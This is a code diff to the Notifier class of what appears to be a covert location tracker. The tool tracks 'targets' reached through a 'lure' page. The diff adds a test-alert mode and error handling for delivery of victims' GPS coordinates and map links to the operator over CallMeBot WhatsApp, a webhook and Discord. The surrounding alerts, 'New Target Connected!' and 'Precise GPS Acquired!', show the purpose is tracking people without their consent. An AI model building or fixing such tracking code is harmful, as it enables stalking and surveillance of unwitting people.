@@ -14,18 +14,23 @@ class Notifier {
 
         const hasWhatsApp = (waPhone && waApiKey) || waWebhook
         if (!hasWhatsApp && !discordWebhook) {
-            return // No notifications configured
+            if (eventType === "test") {
+                throw new Error("No WhatsApp phone/API key or Discord webhook configured yet.")
+            }
+            return
         }
 
         const now = Date.now()
         const lastTime = lastNotified[target.id] || 0
-        const isImportant = eventType === "connect" || eventType === "gps_acquired" || eventType === "geofence_breach"
+        const isImportant = eventType === "connect" || eventType === "gps_acquired" || eventType === "geofence_breach" || eventType === "test"
 
         // Rate limit regular position updates to at most once per 60 seconds per target
         if (!isImportant && (now - lastTime) < 60000) {
             return
         }
-        lastNotified[target.id] = now
+        if (eventType !== "test") {
+            lastNotified[target.id] = now
+        }
 
         const gmapsUrl = `https://www.google.com/maps?q=${target.lat},${target.lng}`
         const timeStr = new Date(target.lastSeen || now).toLocaleTimeString()
@@ -36,7 +41,8 @@ class Notifier {
         const lureStr = target.lure || "Weather"
 
         let title = "📍 Target Location Update"
-        if (eventType === "connect") title = "🚀 New Target Connected!"
+        if (eventType === "test") title = "🧪 TEST ALERT - Live Location Tracker"
+        else if (eventType === "connect") title = "🚀 New Target Connected!"
         else if (eventType === "gps_acquired") title = "🎯 Precise GPS Acquired!"
         else if (eventType === "geofence_breach") title = "⚠️ GEOFENCE BREACH DETECTED!"
 
@@ -53,17 +59,28 @@ class Notifier {
 
             // A) Send via CallMeBot WhatsApp API
             if (waPhone && waApiKey) {
-                try {
-                    const cleanPhone = waPhone.replace(/[^0-9]/g, "")
-                    const encodedText = encodeURIComponent(waMessage)
-                    const url = `https://api.callmebot.com/whatsapp.php?phone=${cleanPhone}&text=${encodedText}&apikey=${encodeURIComponent(waApiKey)}`
+                const cleanPhone = waPhone.replace(/[^0-9]/g, "")
+                const encodedText = encodeURIComponent(waMessage)
+                const url = `https://api.callmebot.com/whatsapp.php?phone=${cleanPhone}&text=${encodedText}&apikey=${encodeURIComponent(waApiKey)}`
 
+                try {
                     const res = await fetch(url)
-                    if (!res.ok) {
-                        console.warn("[WhatsApp CallMeBot Notice]:", res.status, res.statusText)
+                    const body = await res.text()
+
+                    if (body.includes("APIKey is invalid") || body.includes("invalid apikey")) {
+                        const errMsg = "CallMeBot API Key is invalid! Please get your actual numeric key from CallMeBot on WhatsApp."
+                        console.warn("[WhatsApp CallMeBot Notice]:", errMsg)
+                        if (eventType === "test") throw new Error(errMsg)
+                    } else if (body.includes("not registered") || body.includes("Please create a new one") || body.includes("not allowed")) {
+                        const errMsg = "Phone number not registered! Please send 'I allow callmebot to send me messages' to +34 941 87 53 10 on WhatsApp first."
+                        console.warn("[WhatsApp CallMeBot Notice]:", errMsg)
+                        if (eventType === "test") throw new Error(errMsg)
+                    } else {
+                        console.log(`[WhatsApp Alert Sent] Successfully dispatched to +${cleanPhone}`)
                     }
                 } catch (err) {
                     console.warn("[WhatsApp Notifier Error]:", err.message)
+                    if (eventType === "test") throw err
                 }
             }
 
@@ -83,6 +100,7 @@ class Notifier {
                     })
                 } catch (err) {
                     console.warn("[WhatsApp Webhook Error]:", err.message)
+                    if (eventType === "test") throw err
                 }
             }
         }
@@ -122,6 +140,7 @@ class Notifier {
                 })
             } catch (err) {
                 console.warn("[Discord Notifier Error]:", err.message)
+                if (eventType === "test") throw err
             }
         }
     }
